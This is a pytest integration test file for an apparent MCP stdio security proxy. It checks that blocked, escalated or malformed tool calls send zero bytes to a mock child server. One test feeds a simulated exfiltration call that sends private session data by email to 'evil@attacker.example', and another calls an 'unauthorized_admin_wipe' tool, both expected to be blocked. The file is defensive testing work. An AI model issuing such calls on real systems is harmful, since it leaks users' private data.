"""
Integration Tests for Mastyf MCP Stdio Reverse Proxy (Phase 2).

Verifies the Phase 2 Release Gate:
  [✓] Transparent lifecycle & discovery passthrough (initialize, ping, tools/list, notifications)
  [✓] Authorized tools/call execution through child process
  [✓] Strict zero-byte transport non-delivery on CBAC BLOCK
  [✓] Strict zero-byte transport non-delivery on DIFC BLOCK
  [✓] Strict zero-byte transport non-delivery on AIA ESCALATE
  [✓] Malformed JSON-RPC returns -32700 with zero bytes to child
  [✓] Single child-stdout dispatcher with pending request-ID correlation
  [✓] Adversarial out-of-order response demultiplexing
  [✓] Child process crash fails closed with -32603
  [✓] Child timeout fails closed with -32603
"""

import asyncio
import json
import os
import sys
import tempfile
import pytest
from pathlib import Path

from mastyf_gateway.adapters.mcp_stdio_proxy import MCPStdioProxy
from mastyf_gateway.gateway import MastyfGateway
from mastyf_gateway.policy.schemas import PolicyDocument, CapabilityDefinition, ArgumentConstraint
from mastyf_gateway.difc.taint import SecurityTag, SinkCategory
from mastyf_gateway.models import AIADecision, ToolCallRequest

# Mock child MCP server script executed as a subprocess
MOCK_CHILD_SCRIPT = """
import sys
import json
import time

while True:
    line = sys.stdin.readline()
    if not line:
        break
    line_str = line.strip()
    if not line_str:
        continue
    try:
        msg = json.loads(line_str)
    except Exception:
        continue

    req_id = msg.get("id")
    method = msg.get("method")
    params = msg.get("params", {}) or {}

    # Notification has no id
    if req_id is None:
        continue

    if method == "initialize":
        resp = {"jsonrpc": "2.0", "id": req_id, "result": {"protocolVersion": "2024-11-05"}}
    elif method == "ping":
        resp = {"jsonrpc": "2.0", "id": req_id, "result": {}}
    elif method == "tools/list":
        resp = {"jsonrpc": "2.0", "id": req_id, "result": {"tools": [{"name": "read_balance"}, {"name": "send_email"}]}}
    elif method == "tools/call":
        tool_name = params.get("name")
        args = params.get("arguments", {})
        if tool_name == "crash_server":
            sys.exit(42)
        elif tool_name == "delay_tool":
            delay = float(args.get("delay", 0.05))
            time.sleep(delay)
            resp = {"jsonrpc": "2.0", "id": req_id, "result": {"content": [{"type": "text", "text": f"Delayed {delay}s"}]}}
        else:
            resp = {"jsonrpc": "2.0", "id": req_id, "result": {"content": [{"type": "text", "text": f"Backend processed {tool_name}"}]}}
    else:
        resp = {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32601, "message": "Method not found"}}

    sys.stdout.write(json.dumps(resp) + "\\n")
    sys.stdout.flush()
"""

class AdvisoryAuditorForProxyTest:
    def __init__(self, escalate_tools=None):
        self.escalate_tools = set(escalate_tools or [])

    async def evaluate(self, request: ToolCallRequest) -> AIADecision:
        if request.tool_name in self.escalate_tools:
            return AIADecision(
                decision="ESCALATE",
                confidence=0.85,
                reason_code="AIA_SEMANTIC_ANOMALY",
                invariant_violation="suspicious_parameter_magnitude"
            )
        return AIADecision(
            decision="ALLOW",
            confidence=0.99,
            reason_code="AIA_BENIGN_INTENT"
        )


def build_proxy_test_policy() -> PolicyDocument:
    return PolicyDocument(
        policy_id="proxy-test-policy-v1",
        version="1.0",
        capabilities=[
            CapabilityDefinition(
                capability_name="read_balance_cap",
                tool_name="read_balance",
                allowed_principals=["*"],
                argument_constraints={
                    "account_id": ArgumentConstraint(expected_type="string", pattern=r"^ACC-[0-9]{3}$")
                }
            ),
            CapabilityDefinition(
                capability_name="send_email_cap",
                tool_name="send_email",
                allowed_principals=["*"]
            ),
            CapabilityDefinition(
                capability_name="delay_tool_cap",
                tool_name="delay_tool",
                allowed_principals=["*"]
            ),
            CapabilityDefinition(
                capability_name="crash_server_cap",
                tool_name="crash_server",
                allowed_principals=["*"]
            )
        ]
    )


@pytest.fixture
def child_script_path(tmp_path):
    script_file = tmp_path / "mock_mcp_child.py"
    script_file.write_text(MOCK_CHILD_SCRIPT, encoding="utf-8")
    return str(script_file)


@pytest.fixture
def proxy_setup(child_script_path):
    policy = build_proxy_test_policy()
    auditor = AdvisoryAuditorForProxyTest(escalate_tools=["delay_tool_escalate"])
    gateway = MastyfGateway(policy=policy, auditor=auditor)

    # Configure DIFC sink categories
    gateway.difc.tool_sinks["send_email"] = SinkCategory.EXTERNAL_EXFILTRATION_SINK

    proxy = MCPStdioProxy(
        gateway=gateway,
        child_cmd=[sys.executable, child_script_path],
        session_id="test-proxy-sess-1",
        principal_id="test_client",
        timeout_seconds=3.0
    )
    return proxy, gateway


@pytest.mark.asyncio
async def test_passthrough_lifecycle(proxy_setup):
    proxy, _ = proxy_setup
    await proxy.start()

    try:
        # 1. initialize
        init_req = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}})
        init_resp = await proxy.process_message(init_req)
        assert init_resp["id"] == 1
        assert init_resp["result"]["protocolVersion"] == "2024-11-05"

        # 2. notification (no id) -> returns None, forwarded to child
        bytes_before = proxy.child_bytes_written
        notif = json.dumps({"jsonrpc": "2.0", "method": "notifications/initialized"})
        notif_resp = await proxy.process_message(notif)
        assert notif_resp is None
        assert proxy.child_bytes_written > bytes_before

        # 3. ping
        ping_req = json.dumps({"jsonrpc": "2.0", "id": 2, "method": "ping", "params": {}})
        ping_resp = await proxy.process_message(ping_req)
        assert ping_resp["id"] == 2
        assert "result" in ping_resp

        # 4. tools/list
        list_req = json.dumps({"jsonrpc": "2.0", "id": 3, "method": "tools/list", "params": {}})
        list_resp = await proxy.process_message(list_req)
        assert list_resp["id"] == 3
        assert len(list_resp["result"]["tools"]) == 2
    finally:
        await proxy.close()


@pytest.mark.asyncio
async def test_authorized_tool_execution(proxy_setup):
    proxy, _ = proxy_setup
    await proxy.start()

    try:
        req = json.dumps({
            "jsonrpc": "2.0",
            "id": 10,
            "method": "tools/call",
            "params": {
                "name": "read_balance",
                "arguments": {"account_id": "ACC-123"}
            }
        })
        bytes_before = proxy.child_bytes_written
        resp = await proxy.process_message(req)
        assert resp["id"] == 10
        assert "result" in resp
        assert "Backend processed read_balance" in resp["result"]["content"][0]["text"]
        assert proxy.child_bytes_written > bytes_before
    finally:
        await proxy.close()


@pytest.mark.asyncio
async def test_cbac_denied_zero_bytes(proxy_setup):
    proxy, _ = proxy_setup
    await proxy.start()

    try:
        # Unauthorized tool not declared in capabilities
        req = json.dumps({
            "jsonrpc": "2.0",
            "id": 20,
            "method": "tools/call",
            "params": {
                "name": "unauthorized_admin_wipe",
                "arguments": {}
            }
        })
        bytes_before = proxy.child_bytes_written
        resp = await proxy.process_message(req)

        # Invariant checks:
        # 1. Zero bytes written to child
        assert proxy.child_bytes_written == bytes_before
        # 2. Standardized error response
        assert resp["id"] == 20
        assert resp["error"]["code"] == -32001
        assert resp["error"]["data"]["decision"] == "BLOCK"
        assert resp["error"]["data"]["reason_code"] == "CBAC_UNKNOWN_TOOL"
    finally:
        await proxy.close()


@pytest.mark.asyncio
async def test_difc_denied_zero_bytes(proxy_setup):
    proxy, gateway = proxy_setup
    # Taint session with confidential data
    gateway.difc.add_taint(proxy.session_id, SecurityTag.USER_PRIVATE)
    await proxy.start()

    try:
        # Attempt to call send_email (marked as EXTERNAL_EXFILTRATION_SINK)
        req = json.dumps({
            "jsonrpc": "2.0",
            "id": 30,
            "method": "tools/call",
            "params": {
                "name": "send_email",
                "arguments": {"recipient": "evil@attacker.example", "body": "leak"}
            }
        })
        bytes_before = proxy.child_bytes_written
        resp = await proxy.process_message(req)

        # Invariant checks:
        assert proxy.child_bytes_written == bytes_before
        assert resp["id"] == 30
        assert resp["error"]["code"] == -32001
        assert resp["error"]["data"]["decision"] == "BLOCK"
        assert resp["error"]["data"]["reason_code"].startswith("DIFC_DISALLOWED_FLOW")
    finally:
        await proxy.close()


@pytest.mark.asyncio
async def test_aia_escalate_zero_bytes(proxy_setup):
    proxy, gateway = proxy_setup
    # Configure auditor to escalate on read_balance
    gateway.auditor.escalate_tools.add("read_balance")
    await proxy.start()

    try:
        req = json.dumps({
            "jsonrpc": "2.0",
            "id": 40,
            "method": "tools/call",
            "params": {
                "name": "read_balance",
                "arguments": {"account_id": "ACC-123"}
            }
        })
        bytes_before = proxy.child_bytes_written
        resp = await proxy.process_message(req)

        # Invariant checks:
        assert proxy.child_bytes_written == bytes_before
        assert resp["id"] == 40
        assert resp["error"]["code"] == -32001
        assert resp["error"]["data"]["decision"] == "ESCALATE"
        assert resp["error"]["data"]["reason_code"] == "AIA_SEMANTIC_ANOMALY"
    finally:
        await proxy.close()


@pytest.mark.asyncio
async def test_malformed_json_zero_bytes(proxy_setup):
    proxy, _ = proxy_setup
    await proxy.start()

    try:
        malformed = "NOT_VALID_JSON{foo:bar"
        bytes_before = proxy.child_bytes_written
        resp = await proxy.process_message(malformed)

        # Invariant checks:
        assert proxy.child_bytes_written == bytes_before
        assert resp["error"]["code"] == -32700
        assert "Parse error" in resp["error"]["message"]
    finally:
        await proxy.close()


@pytest.mark.asyncio
async def test_child_crash_fail_closed(proxy_setup):
    proxy, _ = proxy_setup
    await proxy.start()

    try:
        req = json.dumps({
            "jsonrpc": "2.0",
            "id": 50,
            "method": "tools/call",
            "params": {
                "name": "crash_server",
                "arguments": {}
            }
        })
        resp = await proxy.process_message(req)
        assert resp["id"] == 50
        assert resp["error"]["code"] == -32603
        assert "Child MCP" in resp["error"]["message"]
    finally:
        await proxy.close()


@pytest.mark.asyncio
async def test_child_timeout_fail_closed(proxy_setup):
    proxy, _ = proxy_setup
    # Set tight timeout
    proxy.timeout_seconds = 0.1
    await proxy.start()

    try:
        req = json.dumps({
            "jsonrpc": "2.0",
            "id": 60,
            "method": "tools/call",
            "params": {
                "name": "delay_tool",
                "arguments": {"delay": 0.5}
            }
        })
        resp = await proxy.process_message(req)
        assert resp["id"] == 60
        assert resp["error"]["code"] == -32603
        assert "timed out" in resp["error"]["message"]
    finally:
        await proxy.close()


@pytest.mark.asyncio
async def test_adversarial_out_of_order_concurrency(proxy_setup):
    """
    Adversarial concurrency test:
      Request 1: delay_tool (delay=0.15s)
      Request 2: delay_tool (delay=0.01s)
    Child emits response 2 first, response 1 second.
    Proxy single-reader correlation table must route:
      client id=1 -> response 1
      client id=2 -> response 2
    without cross-request contamination.
    """
    proxy, _ = proxy_setup
    await proxy.start()

    try:
        req1 = json.dumps({
            "jsonrpc": "2.0",
            "id": "req-slow-1",
            "method": "tools/call",
            "params": {"name": "delay_tool", "arguments": {"delay": 0.15}}
        })
        req2 = json.dumps({
            "jsonrpc": "2.0",
            "id": "req-fast-2",
            "method": "tools/call",
            "params": {"name": "delay_tool", "arguments": {"delay": 0.01}}
        })

        # Launch concurrently
        resp1, resp2 = await asyncio.gather(
            proxy.process_message(req1),
            proxy.process_message(req2)
        )

        assert resp1["id"] == "req-slow-1"
        assert "Delayed 0.15s" in resp1["result"]["content"][0]["text"]

        assert resp2["id"] == "req-fast-2"
        assert "Delayed 0.01s" in resp2["result"]["content"][0]["text"]
    finally:
        await proxy.close()


@pytest.mark.asyncio
async def test_proxy_with_declarative_yaml_policy(child_script_path, tmp_path):
    """Verifies that Phase 1 declarative YAML compiles and enforces cleanly inside Phase 2 stdio proxy."""
    from mastyf_gateway.policy.loader import validate_policy, compile_policy

    yaml_content = """id: yaml-proxy-agent
version: "1.0"
capabilities:
  - tool: read_balance
    actions: [read]
    constraints:
      account_id:
        type: string
        pattern: "^ACC-[0-9]{3}$"
"""
    yaml_file = tmp_path / "proxy_policy.yaml"
    yaml_file.write_text(yaml_content, encoding="utf-8")

    decl = validate_policy(str(yaml_file))
    gw_policy = compile_policy(decl).to_gateway_policy()

    from mastyf_gateway.auditor.aia import MockAIAAuditor
    gateway = MastyfGateway(policy=gw_policy, auditor=MockAIAAuditor(simulated_latency_ms=0.5))
    proxy = MCPStdioProxy(
        gateway=gateway,
        child_cmd=[sys.executable, child_script_path],
        session_id="test-yaml-proxy-sess",
        principal_id="yaml_client"
    )

    await proxy.start()
    try:
        # Valid call per declarative policy
        valid_req = json.dumps({
            "jsonrpc": "2.0",
            "id": 101,
            "method": "tools/call",
            "params": {"name": "read_balance", "arguments": {"account_id": "ACC-555"}}
        })
        resp = await proxy.process_message(valid_req)
        assert resp["id"] == 101
        assert "Backend processed read_balance" in resp["result"]["content"][0]["text"]

        # Call with violated regex constraint
        bad_req = json.dumps({
            "jsonrpc": "2.0",
            "id": 102,
            "method": "tools/call",
            "params": {"name": "read_balance", "arguments": {"account_id": "INVALID"}}
        })
        bytes_before = proxy.child_bytes_written
        bad_resp = await proxy.process_message(bad_req)
        # Zero bytes to child!
        assert proxy.child_bytes_written == bytes_before
        assert bad_resp["id"] == 102
        assert bad_resp["error"]["code"] == -32001
        assert bad_resp["error"]["data"]["decision"] == "BLOCK"
    finally:
        await proxy.close()

